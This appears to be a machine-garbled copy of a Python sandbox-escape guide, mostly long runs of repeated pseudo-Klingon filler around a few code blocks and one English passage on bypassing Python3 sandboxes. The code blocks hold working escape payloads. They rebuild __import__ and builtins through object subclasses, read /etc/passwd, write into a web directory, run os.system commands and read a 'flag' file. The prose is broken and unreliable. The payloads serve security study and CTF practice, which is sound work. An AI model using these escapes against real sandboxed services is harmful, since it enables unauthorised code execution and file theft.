jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'ch
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

vulnerabilities vItlhutlhla' 'ej vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' v
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### qo'noS Builtins

ghobe' `__builtins__` vo' 'oH 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. It provides a rich set of libraries and frameworks that make it easy to develop complex applications.

However, Python3 also has a feature called "sandboxing" that restricts the execution of certain operations for security reasons. Sandboxing is commonly used in cloud/SaaS platforms to prevent malicious code from accessing sensitive resources or causing harm to the system.

In some cases, you may encounter situations where you need to bypass Python3 sandboxes for legitimate reasons, such as testing the security of an application or analyzing its behavior. This can be achieved by exploiting vulnerabilities or using specific techniques to evade the restrictions imposed by the sandbox.

In this guide, we will explore different methods and resources that can be used to bypass Python3 sandboxes. These techniques range from simple tricks to more advanced exploitation techniques, depending on the complexity of the sandbox and the level of security measures in place.

It is important to note that bypassing Python3 sandboxes without proper authorization is illegal and unethical. This guide is intended for educational purposes only and should not be used for any malicious activities.

If you are a developer or a security professional, understanding how Python3 sandboxes work and how they can be bypassed can help you identify and fix potential vulnerabilities in your applications. It can also help you assess the security of third-party applications that you may be using or testing.

Remember to always obtain proper authorization and follow ethical guidelines when performing any security testing or penetration testing activities.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**ghItlhvam**](./#recursive-search-of-builtins-globals) **vItlhutlh** **qagh** **qo'noS** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** 